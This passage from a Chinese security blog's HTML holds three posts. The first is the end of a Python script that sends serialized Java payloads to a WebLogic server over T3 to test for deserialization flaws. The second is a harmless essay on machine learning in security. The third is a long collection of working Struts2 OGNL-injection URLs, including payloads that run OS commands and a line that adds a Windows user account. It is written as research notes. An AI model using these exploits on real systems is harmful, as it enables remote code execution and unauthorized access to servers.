class="string">'000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'</span></div><div class="line">    data2 = <span class="string">'007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'</span>.format(<span class="string">'&#123;:04x&#125;'</span>.format(dport))</div><div class="line">    data3 = <span class="string">'1a7727000d3234322e323134'</span></div><div class="line">    data4 = <span class="string">'2e312e32353461863d1d0000000078'</span></div><div class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</div><div class="line">        sock.send(d.decode(<span class="string">'hex'</span>))</div><div class="line">    time.sleep(2)</div><div class="line">    <span class="built_in">print</span> <span class="string">'send request payload successful,recv length:%d'</span>%(len(sock.recv(2048)))</div><div class="line"></div><div class="line"></div><div class="line">def sendEvilObjData(sock,data):</div><div class="line">    payload=<span class="string">'056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'</span></div><div class="line">    payload+=data</div><div class="line">    payload+=<span class="string">'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'</span></div><div class="line">    payload = <span class="string">'%s%s'</span>%(<span class="string">'&#123;:08x&#125;'</span>.format(len(payload)/2 + 4),payload)</div><div class="line">    sock.send(payload.decode(<span class="string">'hex'</span>))</div><div class="line">    res = <span class="string">''</span></div><div class="line">    try:</div><div class="line">        <span class="keyword">while</span> True:</div><div class="line">            res += sock.recv(4096)</div><div class="line">            time.sleep(0.1)</div><div class="line">    except Exception as e:</div><div class="line">        pass</div><div class="line">    <span class="built_in">return</span> res</div><div class="line"></div><div class="line">def checkVul(res,server_addr,index):</div><div class="line">    p=re.findall(VER_SIG[index], res, re.S)</div><div class="line">    <span class="keyword">if</span> len(p)&gt;0:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is vul %s'</span>%(server_addr[0],server_addr[1],VUL[index])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="built_in">print</span> <span class="string">'%s:%d is not vul %s'</span> % (server_addr[0],server_addr[1],VUL[index])</div><div class="line"></div><div class="line"></div><div class="line">def run(dip,dport,index):</div><div class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="comment">##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整</span></div><div class="line">    sock.settimeout(50)</div><div class="line">    server_addr = (dip, dport)</div><div class="line">    t3handshake(sock,server_addr)</div><div class="line">    buildT3RequestObject(sock,dport)</div><div class="line">    rs=sendEvilObjData(sock,PAYLOAD[index])</div><div class="line">    checkVul(rs,server_addr,index)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</div><div class="line">    dip = <span class="string">'10.8.56.17'</span></div><div class="line">    dport = 7001</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(0,len(VUL)):</div><div class="line">        run(dip,dport,i)</div></pre></td></tr></table></figure></p>
+<p>漏洞验证环境可以用phith0n牛的weblogic环境：<a href="https://github.com/phith0n/vulhub/tree/master/weblogic/weak_password" target="_blank" rel="external">weak_password</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/09/10/Java反序列化漏洞/" data-id="cjca1zrwf000d881b6v0hdbrj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-机器学习再信息安全中的应用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/08/11/机器学习再信息安全中的应用/" class="article-date">
+  <time datetime="2017-08-11T08:44:31.000Z" itemprop="datePublished">2017-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/08/11/机器学习再信息安全中的应用/">机器学习在信息安全中的应用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>前段时间听了一个”机器学习在信息安全中的应用”的讲座，应该是我今年听关于机器学习在信息安全中的应用的最好的一场，研究嘉宾是kkqq大神，后来自己又做了一些思考，在此做一个总结。<br>在和黑客对抗的过程中，面对的威胁有3个不同的认知程度：<br>1.已知的威胁。<br>2.已知的未知的威胁。<br>3.未知的未知的威胁。<br>很多时候，在做产品、做运营和做研究的时，最大的恐惧是面对一个最未知的恐惧；因为只要知道这个情况是已知的，有很多技术手段都是可以解决的。<br>首先我们说一下如何定义和衡量已知和未知。从安全角度来说比较容易：<br>已知的已知就是我如果在做一个产品，我自己每天能看见的，能检测到的；<br>已知的未知就是我自己看不见，也检测不到，但是友商们都有检测；<br>未知的未知确实就是我不知道，除非它发生了，被通过某些机缘巧合的情况下暴露了出来，这个情况下，才会换成我们所谓的已知的未知。<br>做安全的，不管是甲方还是乙方，面临同样的挑战，就是一个事情只要我知道，我所有的分析，所有的IOC，所有的威胁情报都能跟上去，但如果这个事情我不知道，那真是无从下手。<br>其实在每一个层次上面，我们也可以横向定义到我们的产品，我们的运营上面去，我们怎么样去衡量你是不是在这个层次上做得比较好。<br>首先，要解决的是效果问题。这些效果包括我的检出率、召回率、误报率，就是这些不同的指标。但是更重要的是运营的，我怎么去衡量。不管你做任何的系统，你如果一天摔给我1000个报警，那我绝对不可能响应的过来的，所以运营就是事件可响应的数量不能太多。<br>每一个攻击来的时候，如果你不知道它背后是谁，那你这个其实还是没有解决到根本的问题。<br>我们用这个效果运营和知己知彼来衡量你在每个维度上到底能做到什么样的程度。</p>
+<h4 id="规则系统"><a href="#规则系统" class="headerlink" title="规则系统"></a>规则系统</h4><p>我只需要写规则，我就能把这个问题解决掉。但是有一个坏处，严重依赖于安全专家，因为你要想把一个安全场景的检测逻辑转化到一个规则系统里面，你是需要人深入了解到清楚每一个环节。<br>规则系统，就是写规则嘛。它的误报率和检出率都是相对比较认可的，误报也是比较可控的，可运营的。我出了一个误报，我可以做到把这个规则删了就可以了，这样误报就没有了，不影响你整个架构。<br>存在的问题就是规则系统是严重依赖于你的专家的知识，天然的就限制了你的规则系统是基于被动响应的模式的，比如说杀毒软件，只有我有一个样本我才能写一套规则，而且要在过程中是严重依赖于分析师的。我们拿杀毒软件举例子，分析师说我需要确定一下这个家族有什么样的特征，为了很快的能做响应，它有很多烦琐的或者是特别重的自动化流程去做。<br>还是相对有一个好处，能很明确的告诉你，这是什么病毒，这个在有时候，尤其是在互联网企业做安全运营的时候是很重要的指标，因为我如果来了一个远控和我来了一个普通的刷流量的恶意软件，这个威胁程度在我们看来是不一样的。</p>
+<h4 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h4><p>我有一个固定的数据集合集，我有一个模型套上去，我先做一个模型，然后我有检测结果。严重依赖与我们的安全专家，提供精确的数据标签。我需要不断的再把它的结果打上标签，再去逐步做验证，它其实是一个人工辅助的过程。<br>机器学习和以前的规则系统不大一样，以前的规则系统是安全研究员就能搞定的事情。但是在机器学习的场景下，是需要安全专家和数据科学家共同协作的。<br>其实在机器学习的场景下，你会发现安全专家起到的作用要比数据科学家要重一点，因为它里面有一个特征提取的过程，这个特征提取是很严重的依赖于你的专家先验知识的，这些特征提取是数据科学家解决不了的一个问题。<br>机器学习就是它在固定数据集的时候，效果特别好，输入、输出严格限定的话，效果绝对要比规则系统强很多。<br>数据处理要比你的规则系统要强，因为它是天然的和大数据这套东西都结合起来的。<br>但是第二个就有待商榷，它落地的时候这个误报率，第一步它在训练的时候那个指标特别好看，但是安全每天的形势都是在变的，今天你做的四个九、五个九的模型，明天来了一个新的东西，你会发现他以前没考虑到，有误报。这个误报就不是简单的0.001%的标准，很可能放大到一个你没有做运营的场景。<br>在一个规则系统里面，你如果要做误报，这个响应是相对比较容易的，我就删一条规则嘛，大不了加个强限制的的条件。机器学习的时候，你看这个模型是人一眼看上去理解不了的，需要很精确的、很深入的做关联，才能理解机器学习的模型，就意味着你不能通过一个简单的把一个分支改掉的方式解决问题，得需要把模型重新迭代一遍，迭代模型大家做过的都知道，周期是比较长的了。<br>最后一个是它的威胁分类比较困难。</p>
+<h4 id="深度学习"><a href="#深度学习" class="headerlink" title="深度学习"></a>深度学习</h4><p>它在解决大局观的问题下，要比人的性能要好。那我们给它一个定位，它尝试在解决一个已知的未知的问题，它能比机器学习解决得更好。但是它也在尝试着突破未知的未知，这个可能比较难理解，我们后面也展开说一下。<br>它还是严重的依赖专家，给你提供一个初始的数据集用来做标签，用来做结果验证。但是你会明显感觉到，如果大家在说神经网络的时候，你会发现专家的分量降低了，算法和计算或者是模型的层次会变高了。那就变成一个数据科学家主导的过程，而不是专家主导的过程，专家更多是去辅助验证这个模型。<br>深度学习和机器学习都有同样的问题，但是因为它的更不可控性或者是更不理解性，所以就造成了和机器学习有同样的问题，但是会相对比更严重。</p>
+<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><p>特定场景的检测，就是固定输入输出，有固定的规则系统。在固定场景的情况下，还是有很大的潜力去发现已知的未知，甚至于去发现一些未知的未知，这些特定场景我们前面也提到了有一些问题，比如说误报的问题、漏报的问题，也是通过一个运营的方式去解决，但是运营的方和我们以前常见的不一样，我们杀毒软件来了误报了以后，我们都是分析师去处理的，但是在机器学习、人工智能这个大框架下，是通过数据密集型的逻辑去解决的。<br>多维度中的一个维度，因为我们前面提到的，机器学习和深度学习最大的问题可能在落地的时候是有误报的问题和时效性的问题，在泛安全的场景下，其实还有很多场景不需要这么强的对误报的容忍度或者是漏报的容忍度那么低的。而且在大的体系下是只依赖于一个东西做某些程度的决策，而不是要求你做百分百的决策。<br>实时对抗性没那么强。这些场景大家都相对比较熟悉了，就是风控，风控包括人脸识别、用户粗向、策略模型，你会发现在某一个子方向上确实没有程度做到一个我们可以直接拿过来做单一维度的对抗手段，但是你把所有的这些东西综合在一起，因为风控讲的是可控，我们如果是搞攻防对抗的，你有一起安全事故很可能被搞了，但是风控在大的场景下，只有一个百分比的用户的损失是可以接受的，我就是相对比较成功的，所以在这种场景应用是很成功的。<br>威胁情报，很多人可能喜欢把威胁情报归到检测里面去，但是我觉得不是，它主要还是解决知己知彼的问题，在知己知彼的场景下，它其实是可以通过人工后期确认的方式，来达到你要的效果。所以在这个场景下它也没有那么高的实时对抗性的误报的要求。<br>最常见的，后台数据处理，批量数据分析包括聚类、分类这些应用，可能每家都有很成功的应用。</p>
+<h4 id="未知的未知"><a href="#未知的未知" class="headerlink" title="未知的未知"></a>未知的未知</h4><p>未知的未知我们到底怎么解决，是我们现在相对比较前沿的在人工智能方向上的一个，AlphaGo里面用的那套模型，就是Reinforcement  Learning，里面有一个反馈机制，我觉得人工智能的路还很长，但是这些跬步都是一步步积累下来的，我们虽然看不到人工智能在信息安全或者是其他行业的终局，但是能看到的就是Reinforcement  Learning在下一步的人工智能里面相对迭代效果还不错的。<br>如果要落地的话，你会发现数据的重要性远远大于其他所有方面。<br>没有数据就没有大数据，没有大数据就没有人工智能，也没有机器学习。<br>模型，大家有时候可能觉得模型和算法是一套东西，模型在我们的概念就是一个威胁场景，必须要定义好你要解决什么样的问题，在这种情况下用算法适配，而不是反过来。所以我们自己的概念是说数据大于模型，模型大于算法。我们自己切身的体验是，你如果按照这个走的话，你的落地的效果肯定会多一些。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2017/08/11/机器学习再信息安全中的应用/" data-id="cjca1zrwv000v881bcgcike2b" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-解密Struts2-POC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/18/解密Struts2-POC/" class="article-date">
+  <time datetime="2017-07-18T07:44:42.000Z" itemprop="datePublished">2017-07-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/07/18/解密Struts2-POC/">解密Struts2 POC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>struts的威力大家都知道，这里找几个有代表性的POC讲一下，做一个记录。</p>
+<p>#####回显POC<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman.getWriter().println(%22[/ok]%22)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))</div></pre></td></tr></table></figure></p>
+<p>poc2（类型转换漏洞需要把POC加在整型参数上）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))%2b'</span></div></pre></td></tr></table></figure></p>
+<p>poc3（需要注意这里也必须是加载一个String(字符串类型)的参数后面，使用的时候把URL里面的两个foo替换成目标参数（注意POC里面还有个foo））:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22))&amp;z[(foo)(<span class="string">'meh'</span>)]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
+<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%22[/ok]%22),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
+<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22),%23response.close()&#125;</span></div></pre></td></tr></table></figure></p>
+<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=<span class="literal">true</span>,%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23resp.println(%22[ok]%22),%23resp.close()%7D.action</div></pre></td></tr></table></figure></p>
+<p>poc7<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/Struts2/test.action?redirect:<span class="variable">$&#123;%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok]'),%23w.flush(),%23w.close()&#125;</span></div></pre></td></tr></table></figure></p>
+<p>@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)其实是静态调用ServletActionContext; ServletActionContext能够拿到真正的HttpServletRequest、HttpServletResponse、ServletContext。拿到一个HttpServletResponse响应对象后就可以调用getWriter方法(返回的是PrintWriter)让Servlet容器上输出[/ok]了，而其他的POC也都做了同样的事：拿到HttpServletResponse，然后输出[/ok]。其中的allowStaticMethodAccess在Struts2里面默认是false，也就是默认不允许静态方法调用。</p>
+<p>#####精确判断是否存在（延迟判断）:<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(d)((<span class="string">'@java.lang.Thread@sleep(5000)'</span>)(d))</div></pre></td></tr></table></figure></p>
+<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000))%2b'</span></div></pre></td></tr></table></figure></p>
+<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000))(meh%29&amp;z[%28foo%29%28%27meh%27%29]=<span class="literal">true</span></div></pre></td></tr></table></figure></p>
+<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(<span class="literal">false</span>)%2c+%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sleep(5000))(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]</div></pre></td></tr></table></figure></p>
+<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span></div></pre></td></tr></table></figure></p>
+<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.lang.Thread@sleep(5000)&#125;</span>.action</div></pre></td></tr></table></figure></p>
+<p>之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样比之前的回显更靠谱，缺点就是慢。而实现这个POC的方法同样是非常的简单其实就是静态调用java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。</p>
+<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>关于回显：webStr\75new\40byte[100] 修改为合适的长度。<br>poc1<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?(<span class="string">'\43_memberAccess.allowStaticMethodAccess'</span>)(a)=<span class="literal">true</span>&amp;(b)((<span class="string">'\43context[\'</span>xwork.MethodAccessor.denyMethodExecution\<span class="string">']\75false'</span>)(b))&amp;(<span class="string">'\43c'</span>)((<span class="string">'\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET'</span>)(c))&amp;(g)((<span class="string">'\43req\75@org.apache.struts2.ServletActionContext@getRequest()'</span>)(d))&amp;(h)((<span class="string">'\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%22))'</span>)(d))&amp;(i)((<span class="string">'\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'</span>)(d))&amp;(i01)((<span class="string">'\43webStr\75new\40byte[100]'</span>)(d))&amp;(i1)((<span class="string">'\43webRootzproreader.readFully(\43webStr)'</span>)(d))&amp;(i111)(<span class="string">'\43webStr12\75new\40java.lang.String(\43webStr)'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i2)((<span class="string">'\43xman\75@org.apache.struts2.ServletActionContext@getResponse()'</span>)(d))&amp;(i95)((<span class="string">'\43xman.getWriter().println(\43webStr12)'</span>)(d))&amp;(i99)((<span class="string">'\43xman.getWriter().close()'</span>)(d))&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
+<p>poc2<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?id=<span class="string">'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))%2b'</span>&amp;cmd=cmd%20/c%20ipconfig</div></pre></td></tr></table></figure></p>
+<p>poc3<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/freecms/login_login.do?user.loginname=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(<span class="literal">true</span>),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result))&amp;z[(user.loginname)(<span class="string">'meh'</span>)]=<span class="literal">true</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
+<p>poc4<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/test.action?class.classLoader.jarPath=(%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Boolean(<span class="literal">false</span>),%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=<span class="literal">true</span>,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23a=%40java.lang.Runtime%40getRuntime().<span class="built_in">exec</span>(%23req.getParameter(%22cmd%22)).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char%5b50000%5d,%23c.read(%23d),%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(),%23s3cur1ty.println(%23d),%23s3cur1ty.close())(aa)&amp;x[(class.classLoader.jarPath)(<span class="string">'aa'</span>)]&amp;cmd=cmd%20/c%20netstat%20-an</div></pre></td></tr></table></figure></p>
+<p>poc5<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/Struts2/hello.action?a=1<span class="variable">$&#123;%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)),%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()),%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer),%23result=new%20java.lang.String(%23buffer),%23response=@org.apache.struts2.ServletActionContext@getResponse(),%23response.getWriter().println(%23result),%23response.close()&#125;</span>&amp;cmd=cmd%20/c%20set</div></pre></td></tr></table></figure></p>
+<p>poc6<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/struts2-blank/example/HelloWorld.action?redirect:<span class="variable">$&#123;%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'netstat','-an'&#125;</span>)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(<span class="string">'com.opensymphony.xwork2.dispatcher.HttpServletResponse'</span>),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()&#125;</div></pre></td></tr></table></figure></p>
+<p>其实在Java里面要去执行一个命令的方式都是一样的，简单的静态调用方式<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java.lang.Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">"net user selina 123 /add"</span>);</div></pre></td></tr></table></figure></p>
